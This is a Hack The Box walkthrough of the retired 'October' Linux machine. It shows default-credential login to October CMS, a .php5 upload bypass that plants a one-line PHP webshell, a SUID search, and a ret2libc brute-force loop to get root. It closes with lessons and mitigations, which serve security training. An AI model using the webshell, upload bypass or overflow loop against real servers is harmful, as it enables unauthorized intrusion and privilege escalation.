---
machine: October
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, octobercms, upload-bypass, buffer-overflow, aslr, ret2libc]
---

# October — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

October CMS Build 412 keeps the default `admin:admin` credentials. The media manager blocks common PHP extensions but not `.php5`, allowing a webshell upload. Escalation is a stack overflow in the 32-bit SUID `ovrflw`: offset 112, NX, no PIE and nine-bit ASLR, defeated with a ret2libc loop.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,80 <IP>
```

- OpenSSH and Apache 2.4.7 on Ubuntu 14.04.
- `http-title: October CMS - Vanilla`.

## Enumeration

```bash
curl -s http://<IP>/backend
```

The `/backend` panel accepts `admin:admin`. Under Media, `.php` is blocked but `.php5` is not.

## Foothold

```bash
printf '<?php system($_REQUEST["cmd"]); ?>' > cmd.php5
curl -s -F "file=@cmd.php5" http://<IP>/backend/cms/media
curl -s "http://<IP>/storage/app/media/cmd.php5?cmd=id"
```

The webshell runs as `www-data`. A reverse shell is established and stabilised.

## Lateral movement

No pivot is needed. Enumerate the host and locate the SUID binary:

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/local/bin/ovrflw
```

## Privilege escalation

`ovrflw` is i386, no canary, NX and no PIE. `pattern_create` gives an offset of 112. The libc base changes only in nine bits, so ret2libc is attempted in a loop:

```bash
while true; do
  /usr/local/bin/ovrflw "$(python -c 'print "A"*112 + "<system>" + "<exit>" + "<binsh>"')"
done
```

When the base matches, a shell with `euid=0` is returned.

## Evidence

- Panel using default credentials.
- Webshell response and `id`.
- `checksec` of the SUID: NX, no PIE.
- Loop output and `id` with `euid=0`.

## Lessons learned

- Extension blacklists fail when the server interprets other suffixes.
- Low-entropy ASLR can be defeated by brute force.
- Custom SUID binaries deserve a full review.

## Mitigations and detection

- Change default credentials and enforce extension allowlists.
- Disable PHP execution in upload directories.
- Remove unnecessary SUID files and build with canary and PIE.
- Alert on `.php5` uploads and repeated SUID executions.

## References

- <https://www.hackthebox.com/machines/October>
- <https://0xdf.gitlab.io/2019/03/26/htb-october.html>
- <https://www.exploit-db.com/exploits/41936>
- <https://attack.mitre.org/techniques/T1190/>
